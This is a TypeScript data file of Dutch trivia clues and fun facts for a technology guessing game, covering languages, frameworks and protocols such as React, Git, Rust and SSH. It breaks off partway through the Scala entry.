import type { PuzzleText } from '../../shared/types';

/** Hints lopen van moeilijk/vaag naar makkelijk/specifiek. Op puzzel-id (data/shared/puzzles.ts). */
export const puzzles: Record<number, PuzzleText> = {
  1: {
    clues: [
      'Ontstaan in 2011 binnen het advertentieteam van een sociaal netwerk, en twee jaar later open source gemaakt.',
      'De makers vonden dat markup en logica in hetzelfde bestand horen, wat eerst veel mensen dwarszat.',
      'Het maakte het idee populair van een virtuele DOM die wordt vergeleken voordat de echte wordt aangeraakt.',
      'Hooks zoals useState en useEffect vervingen de meeste class-componenten.',
      'De componenten schrijf je meestal in JSX.',
      'De JavaScript-library van Meta voor gebruikersinterfaces, met een Native-broertje voor mobiele apps.'
    ],
    funFact: 'React draaide in 2011 al in productie op de nieuwsfeed van Facebook en in 2012 op Instagram, voordat het in 2013 op JSConf US open source werd.'
  },
  2: {
    clues: [
      'Het begon als intern project bij een platform-as-a-servicebedrijf dat dotCloud heette.',
      'Het maakte Linux-namespaces en cgroups bruikbaar voor mensen die er nog nooit van hadden gehoord.',
      'De images worden in lagen gebouwd, en elke instructie voegt er één toe.',
      '"Het werkt op mijn machine" werd "dan leveren we jouw machine toch mee".',
      'Je beschrijft een image in een bestand vol FROM-, RUN- en COPY-instructies.',
      'Containers, een walvis als logo en een Hub vol images.'
    ],
    funFact: 'Docker werd voor het eerst getoond in een lightning talk van vijf minuten door Solomon Hykes op PyCon 2013.'
  },
  3: {
    clues: [
      'De maker grapte dat hij al zijn projecten naar zichzelf noemt; deze naam is Brits scheldwoord voor een onaangenaam persoon.',
      'Het werd in ongeveer tien dagen geschreven, na een licentieruzie over de tool die de Linux-kernel daarvoor gebruikte.',
      'Elke kopie van een repository bevat de volledige geschiedenis, dus geen enkele server is bijzonder.',
      'Het slaat inhoud op als objecten die je aanspreekt via hun hash: blobs, trees en commits.',
      'rebase, cherry-pick en bisect zijn een paar van de subcommando’s.',
      'Het versiebeheersysteem achter GitHub en GitLab.'
    ],
    funFact: 'Linus Torvalds begon in april 2005 aan Git, en binnen een paar dagen beheerde het zijn eigen broncode.'
  },
  4: {
    clues: [
      'Het begon in 2006 als hobbyproject van een medewerker van Mozilla.',
      'Het staat jaar na jaar bovenaan de lijst met meest bewonderde talen van Stack Overflow.',
      'De compiler houdt bij wie elke waarde bezit en hoe lang elke referentie leeft.',
      'Het belooft geheugenveiligheid zonder garbage collector.',
      'Packages heten crates en beheer je met Cargo.',
      'Fans noemen zichzelf Rustaceans, en de onofficiële mascotte is Ferris de krab.'
    ],
    funFact: 'De naam komt van roestschimmels, die maker Graydon Hoare "overdreven goed gebouwd om te overleven" noemde.'
  },
  5: {
    clues: [
      'Het werd in 2012 intern gebouwd, toen een enorme mobiele app zijn feed niet snel genoeg kon laden.',
      'In 2018 kreeg het een eigen foundation onder de Linux Foundation.',
      'Clients vragen precies de velden op die ze nodig hebben, niet meer en niet minder.',
      'Alles wordt beschreven met een sterk getypeerd schema, en wijzigingen gaan via mutations.',
      'Het draait meestal op één endpoint, als alternatief voor REST.',
      'Een querytaal voor API’s, bedacht bij Facebook, met een roze logo en Apollo-clients.'
    ],
    funFact: 'De "QL" staat voor query language, maar het zit aan geen enkele database vast: resolvers halen data op waar ze maar willen.'
  },
  6: {
    clues: [
      'De naam komt van het Griekse woord voor stuurman.',
      'Het stamt af van een intern Google-systeem dat Borg heet.',
      'De kleinste eenheid die je uitrolt heet een pod.',
      'Je beschrijft de gewenste toestand in YAML en controllers blijven daar naartoe bijsturen.',
      'De command-line tool heet kubectl, hoe je het ook uitspreekt.',
      'Container-orkestratie, vaak afgekort tot k8s.'
    ],
    funFact: 'De zeven spaken in het logo verwijzen naar "Project Seven of Nine", de door Star Trek geïnspireerde interne codenaam.'
  },
  7: {
    clues: [
      'De hoofdarchitect ontwierp eerder Turbo Pascal, Delphi en C#.',
      'Microsoft bracht het in oktober 2012 publiek uit.',
      'Het typesysteem is structureel, en berucht Turing-compleet.',
      'Bijna alles wat je erin schrijft verdwijnt bij het compileren.',
      'De bestanden eindigen op .ts, en je kunt het stap voor stap aan een bestaande codebase toevoegen.',
      'JavaScript met statische types.'
    ],
    funFact: 'De compiler wordt naar Go overgezet voor een ongeveer tien keer zo snelle versie; die native compiler verschijnt als versie 7.'
  },
  8: {
    clues: [
      'Het groeide in de jaren tachtig uit een onderzoeksproject in Berkeley onder leiding van Michael Stonebraker.',
      'De oorspronkelijke naam zei dat het na Ingres kwam.',
      'Halverwege de jaren negentig kreeg het SQL-ondersteuning en een naam die dat liet zien.',
      'Het staat bekend om MVCC, extensies zoals PostGIS en JSONB-kolommen.',
      'De command-line client heet psql, en de mascotte is een olifant die Slonik heet.',
      'De open-source relationele database die meestal Postgres wordt genoemd.'
    ],
    funFact: 'De olifantmascotte Slonik is vernoemd naar het Russische woord voor "olifantje".'
  },
  9: {
    clues: [
      'Het werd in 2015 aangekondigd als gezamenlijk project van de teams achter alle vier grote browser-engines.',
      'In 2019 werd het een W3C Recommendation.',
      'Het is een stack-gebaseerde virtuele machine met een compact binair formaat.',
      'Het tekstformaat gebruikt S-expressions, in bestanden die op .wat eindigen.',
      'Je compileert Rust, C of C++ ernaartoe en draait het resultaat bijna op native snelheid in de browser.',
      'Vaak afgekort tot Wasm, de vierde taal van het web.'
    ],
    funFact: 'Het groeide uit asm.js, een strikte subset van JavaScript die browsers vooraf konden optimaliseren.'
  },
  10: {
    clues: [
      'De maker begon eraan als hobbyproject in de kerstvakantie van 1989.',
      'Die maker had tot 2018 de titel "Benevolent Dictator For Life".',
      'De stijlgids staat bekend onder een nummer: PEP 8.',
      'Inspringen is niet optioneel: het bepaalt de blokken.',
      'import this toont de Zen ervan, en pip installeert de packages.',
      'Vernoemd naar een Britse comedygroep, niet naar een slang.'
    ],
    funFact: 'Guido van Rossum noemde het naar Monty Python’s Flying Circus; het slangenlogo kwam later.'
  },
  11: {
    clues: [
      'De tweede grote versie was een complete herschrijving die met de eerste weinig meer dan de naam deelde.',
      'Google onderhoudt het, en sinds die herschrijving gebruikt het TypeScript.',
      'Het leunt op dependency injection, decorators en sinds kort signals.',
      'De CLI genereert componenten, services en hele workspaces.',
      'Standalone componenten vervingen NgModules als standaard.',
      'Het framework van Google met een rood schildlogo, opvolger van AngularJS.'
    ],
    funFact: 'Codeguessr zelf is ermee gebouwd, vooraf gerenderd naar statische HTML voor GitHub Pages.'
  },
  12: {
    clues: [
      'De eerste versie van Tim Berners-Lee had precies één methode.',
      'Versie 1.1 werd in 1997 gestandaardiseerd en hield verbindingen standaard open.',
      'Elk antwoord begint met een statuscode van drie cijfers.',
      'Iedereen kent 404; minder mensen kennen 418, "I\'m a teapot".',
      'De derde versie draait over QUIC in plaats van TCP.',
      'Het protocol achter elke webpagina; met een S erachter is het versleuteld.'
    ],
    funFact: 'Versie 0.9 had één methode, GET, en helemaal geen headers of statuscodes.'
  },
  13: {
    clues: [
      'Een Italiaanse developer schreef het in 2009 om een startup voor realtime webanalyse te versnellen.',
      'Het houdt alles in het geheugen en doet het meeste werk op één thread.',
      'Naast strings biedt het lists, sets, sorted sets, hashes en streams.',
      'Mensen gebruiken het als cache, message broker en rate limiter.',
      'SET, GET, EXPIRE en INCR zijn een paar van de commando’s.',
      'Een in-memory key-value store waarvan de naam staat voor REmote DIctionary Server.'
    ],
    funFact: 'Een licentiewijziging in 2024 leidde tot Valkey, een fork met steun van de Linux Foundation.'
  },
  14: {
    clues: [
      'De maker kondigde het in 1991 aan als "gewoon een hobby, wordt niet groot en professioneel zoals GNU".',
      'Een beheerder van een FTP-server koos de naam; de maker wilde het Freax noemen.',
      'Strikt genomen is het alleen een kernel, al bedoelen mensen meestal een heel besturingssysteem.',
      'Het draait op alle 500 snelste supercomputers ter wereld en op elke Android-telefoon.',
      'Distributies zijn onder meer Debian, Fedora, Arch en Ubuntu.',
      'De kernel van Linus Torvalds, met een pinguïn als mascotte: Tux.'
    ],
    funFact: 'Sinds november 2017 draait elk systeem op de TOP500-lijst van supercomputers erop.'
  },
  15: {
    clues: [
      'Een oud-medewerker van Google die met AngularJS had gewerkt, begon het in 2013.',
      'Het noemt zichzelf "het progressieve framework".',
      'Single-file componenten bevatten template, script en stijl samen.',
      'Versie 3 voegde de Composition API toe naast de Options API.',
      'Het ecosysteem heeft Pinia voor state en Nuxt voor full-stack apps.',
      'Het framework van Evan You, met een groen V-vormig logo.'
    ],
    funFact: 'De naam is Frans voor "view", de V in MVC.'
  },
  16: {
    clues: [
      'Drie engineers ontwierpen het in 2007 bij Google, terwijl ze wachtten tot een grote C++-build klaar was.',
      'Twee van hen, Ken Thompson en Rob Pike, werkten ook aan Unix en UTF-8.',
      'Het heeft geen classes, en de eerste twaalf jaar ook geen generics.',
      'Het compileert naar één statische binary, en de formatter beslecht elke stijldiscussie.',
      'Concurrency komt van goroutines en channels.',
      'De taal met een gopher als mascotte, ook wel Golang genoemd.'
    ],
    funFact: 'De gopher is getekend door Renée French, die ook Glenda tekende, het konijn van Plan 9.'
  },
  17: {
    clues: [
      'Het werd in 2011 gestandaardiseerd als RFC 6455.',
      'Een verbinding begint als gewoon HTTP-verzoek met een Upgrade-header.',
      'Na de handshake kunnen beide kanten berichten sturen wanneer ze willen.',
      'Het is de gebruikelijke keuze voor chat-apps, live dashboards en multiplayergames in de browser.',
      'De URL’s beginnen met ws:// of wss://.',
      'Een full-duplex verbinding tussen browser en server over één TCP-socket.'
    ],
    funFact: 'De server bewijst dat hij de handshake begreep door de sleutel van de client te hashen met een vaste GUID, 258EAFA5-E914-47DA-95CA-C5AB0DC85B11.'
  },
  18: {
    clues: [
      'Ryan Dahl presenteerde het in 2009 op JSConf EU.',
      'Het haalde de V8-engine van Google uit de browser.',
      'De event loop is gebouwd op libuv en handelt I/O af zonder te blokkeren.',
      'Een package manager die een jaar later verscheen, maakte het enorm populair.',
      'Je schrijft er servers mee in JavaScript, eerst met require() en later met ES modules.',
      'De server-side JavaScript-runtime met een groen zeshoekig logo.'
    ],
    funFact: 'De maker bouwde later Deno, deels om op te lossen wat hij zijn spijtpunten erover noemde.'
  },
  19: {
    clues: [
      'Douglas Crockford zegt dat hij het ontdekte in plaats van uitvond.',
      'Het heeft bewust geen commentaar, zodat niemand dat kon misbruiken voor parse-instructies.',
      'Het kent alleen objecten, arrays, strings, getallen, booleans en null.',
      'Een komma na het laatste element is er een syntaxfout.',
      'In de browser zet je ernaar en ervan om met stringify en parse.',
      'JavaScript Object Notation.'
    ],
    funFact: 'De ECMA-standaard ervan heeft nummer ECMA-404, wat developers verdacht toepasselijk vinden.'
  },
  20: {
    clues: [
      'Een graphics-redacteur bij The Guardian maakte het in 2016.',
      'Het noemt zichzelf een compiler, niet een framework dat je naar de browser stuurt.',
      'Het heeft geen virtuele DOM: componenten compileren naar code die de pagina direct bijwerkt.',
      'Versie 5 introduceerde runes zoals $state en $derived.',
      'Componenten staan in bestanden met een eigen extensie, en het app-framework erbovenop eindigt op "Kit".',
      'Het "verdwijnende framework" van Rich Harris, met een oranje S als logo.'
    ],
    funFact: 'Vercel nam Rich Harris in 2021 aan om er fulltime aan te werken.'
  },
  21: {
    clues: [
      'Het werd in 2000 geschreven voor software op een geleidewapenjager van de Amerikaanse marine.',
      'De broncode is publiek domein, en in plaats van een licentie krijg je een zegen.',
      'Een hele database staat in één gewoon bestand.',
      'Het is waarschijnlijk de meest gebruikte database-engine: elke telefoon en browser heeft het aan boord.',
      'Er is geen serverproces; het draait als library binnen je applicatie.',
      'De kleine ingebedde SQL-database met een veer in het logo.'
    ],
    funFact: 'De makers willen het tot 2050 ondersteunen, en de Amerikaanse Library of Congress raadt het bestandsformaat aan voor langdurige opslag.'
  },
  22: {
    clues: [
      'Bram Moolenaar bracht het in 1991 voor het eerst uit, voor de Amiga.',
      'Het was charityware: gebruikers werd gevraagd te doneren aan kinderen in Oeganda.',
      'Het werkt met modi: normal mode voor commando’s, insert mode voor typen.',
      'De toetsen h, j, k en l bewegen de cursor.',
      'Hoe je het afsluit is een van de bekendste vragen op Stack Overflow.',
      'Vi IMproved, met een moderne fork die Neovim heet.'
    ],
    funFact: 'De Stack Overflow-vraag over hoe je het afsluit, is miljoenen keren bekeken.'
  },
  23: {
    clues: [
      'JetBrains kondigde het in 2011 aan en vernoemde het naar een plek, net als de taal die het wilde vervangen.',
      'Het draait op de JVM en werkt naadloos samen met Java-code.',
      'Het typesysteem maakt onderscheid tussen nullable en non-null types.',
      'Coroutines zijn het antwoord op asynchrone code.',
      'In 2019 maakte Google het de voorkeurstaal voor Android.',
      'De taal van JetBrains, in bestanden die op .kt eindigen.'
    ],
    funFact: 'Java is vernoemd naar een eiland, en dit ook: Kotlin, een eiland in de Finse Golf.'
  },
  24: {
    clues: [
      'HashiCorp bracht het in 2014 uit.',
      'Een licentiewijziging in 2023 leidde tot een fork die OpenTofu heet.',
      'Je beschrijft infrastructuur in HCL en het berekent een plan.',
      'Het houdt in een state-bestand bij wat het heeft aangemaakt.',
      'plan, apply en destroy zijn de belangrijkste commando’s.',
      'De infrastructure-as-codetool van HashiCorp, met .tf-bestanden.'
    ],
    funFact: 'IBM sprak in 2024 af HashiCorp te kopen voor ongeveer 6,4 miljard dollar.'
  },
  25: {
    clues: [
      'Het begon in 2006, toen developers bij Twitter wilden dat apps accounts konden gebruiken zonder om wachtwoorden te vragen.',
      'Versie 2.0 verscheen in 2012 als RFC 6749.',
      'Het gaat over autorisatie, niet authenticatie; OpenID Connect voegt de identiteitslaag toe.',
      'De flows zijn onder meer authorization code, client credentials en device code.',
      'PKCE beschermt de authorization code flow voor apps die geen geheim kunnen bewaren.',
      'Het protocol achter "Inloggen met Google" dat access tokens uitdeelt.'
    ],
    funFact: 'De Google-login van Codeguessr zelf gebruikt de authorization code flow met PKCE, via Supabase.'
  },
  26: {
    clues: [
      'Håkon Wium Lie stelde het in 1994 voor, toen hij bij CERN werkte.',
      'Het eerste level werd in 1996 een W3C Recommendation.',
      'Specificiteit en de cascade bepalen welke regel wint.',
      'Flexbox en Grid maakten layout eindelijk begrijpelijk.',
      'Recente toevoegingen zijn :has(), nesting en container queries.',
      'Cascading Style Sheets.'
    ],
    funFact: 'Jarenlang was "hoe centreer ik een div" de vaste grap; nu is het antwoord "display: grid; place-items: center".'
  },
  27: {
    clues: [
      'Adam Wathan bracht het in 2017 uit, na een blogpost die semantische classnamen ter discussie stelde.',
      'In plaats van componenten krijg je kleine classes met één doel.',
      'Critici vinden dat het inline styles terugbrengt in de HTML; fans willen nooit meer een class bedenken.',
      'De build-stap scant je bestanden en genereert alleen de classes die je gebruikt.',
      'De classes zien eruit als flex, pt-4, text-center en md:grid-cols-2.',
      'Het utility-first CSS-framework.'
    ],
    funFact: 'Versie 4 verhuisde de configuratie van een JavaScript-bestand naar CSS zelf.'
  },
  28: {
    clues: [
      'Igor Sysoev begon er in 2002 aan om het C10k-probleem op te lossen.',
      'Het werd eerst gebouwd voor Rambler, een Russisch webportaal.',
      'Het werkt event-driven in plaats van met een thread per verbinding.',
      'Het is webserver, reverse proxy, load balancer en cache in één.',
      'De naam spreek je uit als "engine-x".',
      'De webserver die Apache inhaalde als meest gebruikte op het web.'
    ],
    funFact: 'F5 Networks kocht het bedrijf erachter in 2019 voor 670 miljoen dollar.'
  },
  29: {
    clues: [
      'Het bedrijf 10gen bouwde het in 2007, oorspronkelijk als onderdeel van een platform-as-a-service.',
      'De naam komt van het Engelse woord "humongous".',
      'Het slaat documenten op als BSON, een binaire vorm van JSON.',
      'Je bevraagt het met find() en aggregation pipelines in plaats van SQL.',
      'De beheerde clouddienst heet Atlas.',
      'De bekendste documentdatabase, met een groen blaadje als logo.'
    ],
    funFact: 'Een animatievideo uit 2010 die het bespotte als "web scale" werd een van de bekendste programmeermemes.'
  },
  30: {
    clues: [
      'Chris Lattner begon er in 2010 aan, nadat hij LLVM had gemaakt.',
      'Apple presenteerde het op WWDC 2014.',
      'Optionals dwingen je om met ontbrekende waarden om te gaan.',
      'Het verving Objective-C als standaardtaal voor Apple-platformen.',
      'Playgrounds voeren je code regel voor regel uit terwijl je typt.',
      'De taal van Apple voor iOS- en macOS-apps, met een vogel als logo.'
    ],
    funFact: 'Het werd in december 2015 open source en draait ook op Linux en Windows.'
  },
  31: {
    clues: [
      'Tobias Koppers begon er in 2012 aan als hobbyproject.',
      'Instagram was een van de eerste grote gebruikers.',
      'Het bouwt een dependency graph vanaf een entry point en levert bundles op.',
      'Loaders zetten bestanden om, en plugins haken in op de hele compilatie.',
      'Het configbestand is berucht lang, en hot module replacement kwam uit de dev-server ervan.',
      'De JavaScript module bundler met een blauwe kubus als logo, nu uitgedaagd door Vite.'
    ],
    funFact: 'De maker bouwde het nadat zijn pull request voor code splitting in een andere bundler niet werd geaccepteerd.'
  },
  32: {
    clues: [
      'Paul Mockapetris ontwierp het in 1983 als vervanging van één gedeeld hosts-bestand.',
      'Bovenaan staan dertien benoemde root-server-identiteiten.',
      'Het draait meestal over UDP-poort 53.',
      'A, AAAA, CNAME en MX zijn een paar van de recordtypes.',
      'Een beroemde sysadmin-haiku eindigt met: "It was ___."',
      'Het telefoonboek van internet, dat namen omzet in IP-adressen.'
    ],
    funFact: 'Codeguessr woont op een van de CNAME-records ervan: codeguessr wijst naar een github.io-host.'
  },
  33: {
    clues: [
      'Het team van James Gosling begon er in 1991 aan bij Sun, onder de naam Oak.',
      'De slogan was "write once, run anywhere".',
      'Het compileert naar bytecode voor een virtuele machine.',
      'Oracle is sinds de overname van Sun in 2010 de eigenaar.',
      'Minecraft werd er oorspronkelijk in geschreven, net als talloze enterprise-backends.',
      'De taal met een koffiekop als logo en public static void main.'
    ],
    funFact: 'Het kreeg een nieuwe naam omdat "Oak" al een merknaam was; de nieuwe naam komt van koffie.'
  },
  34: {
    clues: [
      'José Valim maakte het in 2011, na jaren werk aan Ruby on Rails.',
      'Het compileert naar bytecode voor de BEAM, de virtuele machine van Erlang.',
      'Lichtgewicht processen en supervisors laten systemen zichzelf herstellen.',
      'De pipe-operator |> koppelt functieaanroepen aan elkaar.',
      'Phoenix is het bekendste webframework ervoor, beroemd om LiveView.',
      'De functionele taal met een paarse druppel als logo en .ex-bestanden.'
    ],
    funFact: 'Sinds versie 1.17 in 2024 krijgt het stap voor stap een verzamelingstheoretisch typesysteem.'
  },
  35: {
    clues: [
      'Het begon in 2004 bij Sun onder een andere naam: Hudson.',
      'In 2011 kreeg het de huidige naam, na een conflict met Oracle.',
      'De pipelines schrijf je in een DSL op basis van Groovy.',
      'Meer dan duizend plugins breiden het uit.',
      'De mascotte is een butler.',
      'De zelfgehoste automatiseringsserver die al CI draaide lang voor GitHub Actions.'
    ],
    funFact: 'De maker, Kohsuke Kawaguchi, schreef het omdat hij steeds de build brak.'
  },
  36: {
    clues: [
      'Een bedrijf dat toen Zeit heette, bracht het in 2016 uit.',
      'Het begon als manier om React op de server te renderen met bijna geen configuratie.',
      'Pagina’s waren bestanden in een pages-map, en later in een app-map.',
      'De meeste developers leerden React Server Components erdoor kennen.',
      'getServerSideProps en incremental static regeneration zijn termen ervan.',
      'Het React-framework van Vercel.'
    ],
    funFact: 'Het bedrijf erachter heette Zeit tot het zich in 2020 Vercel ging noemen.'
  },
  37: {
    clues: [
      'Brian Fox schreef het in 1989 voor het GNU-project.',
      'De naam is een woordgrap op de shell die het verving, geschreven door Stephen Bourne.',
      'Shellshock, een bug uit 2014 in hoe het met omgevingsvariabelen omging, trof miljoenen servers.',
      'Het is de standaardshell op de meeste Linux-distributies; macOS stapte in 2019 over op zsh.',
      'Scripts beginnen met #!/bin/… en variabelen zien eruit als $HOME.',
      'De Bourne Again SHell.'
    ],
    funFact: 'macOS leverde jarenlang een versie uit 2007 mee, omdat nieuwere versies onder de GPLv3-licentie vallen.'
  },
  38: {
    clues: [
      'LinkedIn bouwde het rond 2010 om enorme hoeveelheden activiteitsdata te verplaatsen.',
      'De maker noemde het naar een schrijver, omdat het "een systeem is dat geoptimaliseerd is voor schrijven".',
      'Het slaat berichten op in een append-only, gepartitioneerde, gerepliceerde log.',
      'Consumers houden zelf hun offset bij en kunnen de geschiedenis opnieuw afspelen.',
      'De makers richtten Confluent op om het als dienst te verkopen.',
      'Het gedistribueerde event-streamingplatform van Apache, vernoemd naar Franz.'
    ],
    funFact: 'Jay Kreps vernoemde het naar schrijver Franz Kafka, simpelweg omdat hij zijn werk mooi vond.'
  },
  39: {
    clues: [
      'Het groeide uit Stubby, het interne RPC-systeem van Google.',
      'Google maakte het in 2015 open source; nu is het een CNCF-project.',
      'Het draait over HTTP/2 en ondersteunt streaming in beide richtingen.',
      'Services en berichten definieer je in .proto-bestanden.',
      'Protocol Buffers zijn het standaard serialisatieformaat.',
      'Het snelle RPC-framework van Google, waarvan de "g" in elke release iets anders betekent.'
    ],
    funFact: 'Elke release geeft de "g" een nieuwe betekenis, van "good" en "green" tot "gravity" en "goose".'
  },
  40: {
    clues: [
      'Rasmus Lerdorf schreef het in 1994 om bezoeken aan zijn online cv bij te houden.',
      'De maker heeft gezegd dat hij nooit van plan was een programmeertaal te maken.',
      'Alle variabelen beginnen met een dollarteken.',
      'WordPress is erin geschreven, en daarmee een groot deel van het web.',
      'De naam stond ooit voor Personal Home Page; nu is het een recursief acroniem.',
      'Hypertext Preprocessor, met een olifant als mascotte: de elePHPant.'
    ],
    funFact: 'Versie 6 is nooit verschenen: de Unicode-herschrijving werd gestaakt en de volgende release werd 7.'
  },
  41: {
    clues: [
      'Het werd gebouwd bij een krant in Lawrence, Kansas, en in 2005 uitgebracht.',
      'Het is vernoemd naar een jazzgitarist.',
      'Het levert automatisch een beheerinterface mee.',
      'ORM, migraties en templates zitten er allemaal in: "batteries included".',
      'De slogan: "The web framework for perfectionists with deadlines."',
      'Het bekendste webframework voor Python, vernoemd naar Django Reinhardt.'
    ],
    funFact: 'Instagram draait een van de grootste installaties ervan ter wereld.'
  },
  42: {
    clues: [
      'Een commissie maakte het in 1990 om de vele luie functionele talen van die tijd samen te brengen.',
      'Het is puur functioneel: functies hebben geen bijwerkingen.',
      'Het evalueert lui, dus oneindige lijsten zijn geen probleem.',
      'Bijwerkingen lopen via monads, het onderwerp van talloze tutorials.',
      'GHC is de belangrijkste compiler, en Cabal en Stack bouwen de projecten.',
      'De puur functionele taal vernoemd naar logicus Haskell Curry.'
    ],
    funFact: 'Pandoc, de universele documentconverter, is erin geschreven.'
  },
  43: {
    clues: [
      'Microsoft kondigde het in 2015 aan op de Build-conferentie.',
      'Het is gebouwd op Electron, en de editor-kern werd de Monaco-editor.',
      'Het introduceerde het Language Server Protocol.',
      'De marketplace heeft tienduizenden extensies.',
      'Stack Overflow-enquêtes noemen het jaar na jaar de populairste ontwikkelomgeving.',
      'De gratis code-editor van Microsoft, niet te verwarren met Visual Studio.'
    ],
    funFact: 'De broncode valt onder MIT, maar de versie van Microsoft voegt telemetrie en branding toe; VSCodium haalt beide weg.'
  },
  44: {
    clues: [
      'De maker introduceerde het in 2018 in een talk over tien dingen waar hij spijt van had.',
      'De naam is een anagram van de voorganger.',
      'Het is geschreven in Rust en draait TypeScript zonder build-stap.',
      'Scripts krijgen geen toegang tot bestanden, netwerk of omgeving tenzij je die met flags toestaat.',
      'Versie 2 voegde volledige compatibiliteit met npm en package.json toe.',
      'De tweede JavaScript-runtime van Ryan Dahl, met een dinosaurus als mascotte.'
    ],
    funFact: 'In 2024 vroeg het bedrijf erachter het Amerikaanse merkenbureau om Oracles merk "JavaScript" te schrappen.'
  },
  45: {
    clues: [
      'Een Finse onderzoeker schreef het in 1995, na een aanval waarbij wachtwoorden op zijn universiteitsnetwerk werden afgeluisterd.',
      'De standaardpoort, 22, ligt tussen die van de twee oudere protocollen die het verving.',
      'Het maakte telnet en rlogin overbodig.',
      'Met public-key-authenticatie log je in zonder wachtwoord te typen.',
      'Het kan poorten doorsturen, verkeer tunnelen en bestanden kopiëren met scp.',
      'Secure Shell.'
    ],
    funFact: 'Tatu Ylönen kreeg poort 22 door IANA te mailen en erom te vragen; de volgende dag was het nummer van hem.'
  },
  46: {
    clues: [
      'David Heinemeier Hansson haalde het in 2004 uit Basecamp.',
      'De filosofie: convention over configuration, en don’t repeat yourself.',
      'Een beroemde video uit 2005 liet zien hoe je er in 15 minuten een blog mee bouwt.',
      'ActiveRecord koppelt je databasetabellen aan classes.',
      'GitHub, Shopify en Basecamp draaien erop.',
      'Het Ruby-webframework dat meestal gewoon Rails heet.'
    ],
    funFact: 'De maker racet ook auto’s, en won in 2014 zijn klasse in de 24 uur van Le Mans.'
  },
  47: {
    clues: [
      'Anders Hejlsberg leidde rond 2000 het ontwerp ervan bij Microsoft.',
      'De werknaam was Cool: "C-like Object Oriented Language".',
      'LINQ bracht query-syntax naar de taal zelf.',
      'async/await werd hier gemeengoed, voordat JavaScript het overnam.',
      'Het draait op .NET en drijft Unity-games aan.',
      'De taal van Microsoft waarvan de naam een muzieknoot is.'
    ],
    funFact: 'Het kruis in de naam is een halve toon hoger dan de noot; Microsoft ziet er ook graag vier gestapelde plustekens in.'
  },
  48: {
    clues: [
      'De maker schreef eerder een zoekbibliotheek om zijn vrouw te helpen haar recepten te doorzoeken.',
      'Het is gebouwd op de Apache Lucene-library.',
      'Het slaat JSON-documenten op in inverted indexes, verdeeld over shards.',
      'Het is de E in de ELK-stack, samen met Logstash en Kibana.',
      'Een licentiewijziging in 2021 zette AWS ertoe aan het te forken als OpenSearch.',
      'De gedistribueerde zoek- en analyse-engine van Elastic.'
    ],
    funFact: 'In 2024 werd het weer open source door de AGPL als licentieoptie toe te voegen.'
  },
  49: {
    clues: [
      'Evan You maakte het in 2020, terwijl hij aan de volgende versie van zijn framework werkte.',
      'De naam is het Franse woord voor "snel".',
      'Tijdens ontwikkeling serveert het native ES modules en slaat het bundelen over.',
      'Het gebruikt esbuild voor dependencies en Rollup, nu Rolldown, voor productiebuilds.',
      'Het is de standaard voor SvelteKit, Nuxt, Astro en de meeste nieuwe React-projecten.',
      'De snelle frontend-buildtool met een paarse bliksemschicht als logo.'
    ],
    funFact: 'Vitest, de bijbehorende testrunner, gebruikt dezelfde config en plugins.'
  },
  50: {
    clues: [
      'Het volgde een protocol op dat Netscape halverwege de jaren negentig ontwierp.',
      'Versie 1.3 uit 2018 bracht de handshake terug tot één round trip.',
      'Het vertrouwt op certificaten, ondertekend door certificaatautoriteiten, om identiteit te bewijzen.',
      'Heartbleed was een bug uit 2014 in de populairste library die het implementeert.',
      'Let’s Encrypt maakte de certificaten ervoor gratis.',
      'Transport Layer Security, de S in HTTPS.'
    ],
    funFact: 'Mensen zeggen nog steeds "SSL", terwijl alle SSL-versies al jaren zijn afgeschaft.'
  },
  51: {
    clues: [
      'Het werd in 1993 gemaakt aan een universiteit in Rio de Janeiro.',
      'De naam is het Portugese woord voor "maan".',
      'Tables zijn de enige datastructuur, voor arrays, maps en objecten tegelijk.',
      'Arrays beginnen bij index 1.',
      'Roblox, add-ons voor World of Warcraft en Neovim-configuraties gebruiken het.',
      'De kleine inbedbare scripttaal uit Brazilië.'
    ],
    funFact: 'Roblox bouwde er een eigen getypeerd dialect van, Luau.'
  },
  52: {
    clues: [
      'Facebook bracht het in 2014 uit.',
      'Het oorspronkelijke verkoopargument was dat het elke module automatisch mockte.',
      'Snapshot testing maakte het beroemd.',
      'describe, it en expect zijn de kernfuncties.',
      'Het was de standaard testrunner in create-react-app.',
      'Het JavaScript-testframework waarvan de naam een grap is.'
    ],
    funFact: 'Meta droeg het in 2022 over aan de OpenJS Foundation.'
  },
  53: {
    clues: [
      'Michael DeHaan bracht het in 2012 uit.',
      'De naam komt van een apparaat uit sciencefiction dat sneller dan het licht communiceert.',
      'Het is agentless: het maakt via SSH verbinding met machines.',
      'Playbooks in YAML beschrijven de gewenste toestand.',
      'Red Hat kocht het bedrijf erachter in 2015.',
      'De agentless automatiseringstool van Red Hat.'
    ],
    funFact: 'Het woord werd bedacht door Ursula K. Le Guin, in haar roman Rocannon’s World uit 1966.'
  },
  54: {
    clues: [
      'Bjarne Stroustrup begon er in 1979 aan bij Bell Labs, als "C with Classes".',
      'De naam is een grap over de increment-operator.',
      'De templates bleken per ongeluk Turing-compleet te zijn.',
      'RAII koppelt de levensduur van een resource aan die van een object.',
      'Unreal Engine, Chrome en de meeste game-engines zijn erin geschreven.',
      'De uitbreiding van C door Stroustrup, met om de drie jaar een nieuwe ISO-standaard.'
    ],
    funFact: 'De standaard wordt elke drie jaar herzien; de editie van 2023 is de zevende.'
  },
  55: {
    clues: [
      'Roy Fielding beschreef het in 2000 in zijn proefschrift.',
      'Hij was ook medeauteur van de HTTP/1.1-specificatie.',
      'Het is een architectuurstijl, geen protocol of standaard.',
      'Statelessness en een uniforme interface horen bij de eisen ervan.',
      'Resources hebben URL’s en je wijzigt ze met GET, POST, PUT en DELETE.',
      'Representational State Transfer.'
    ],
    funFact: 'Fielding klaagt dat de meeste API’s die zich ernaar noemen hypermedia negeren, een van de kerneisen.'
  },
  56: {
    clues: [
      'Het begon in 1976 als een verzameling macro’s voor de TECO-editor.',
      'Richard Stallman schreef de GNU-versie in 1984.',
      'Je breidt het uit in, en het is grotendeels geschreven in, een eigen Lisp-dialect.',
      'De sneltoetsen leverden de bijnaam "Escape Meta Alt Control Shift" op.',
      'Org mode, Magit en een ingebouwde psychotherapeut draaien erin.',
      'De eeuwige rivaal van Vim in de editor wars.'
    ],
    funFact: 'M-x doctor start een therapeut in ELIZA-stijl, gewoon in de editor.'
  },
  57: {
    clues: [
      'Martin Odersky ontwierp het aan de EPFL in Zwitserland en bracht het in 2004 uit.',
      'De naam is kort voor "scalable language".',
      'Het combineert objectgeoriënteerd en functioneel programmeren op de JVM.',
      'Twitter verhuisde een groot deel van zijn backend van Ruby ernaartoe.',
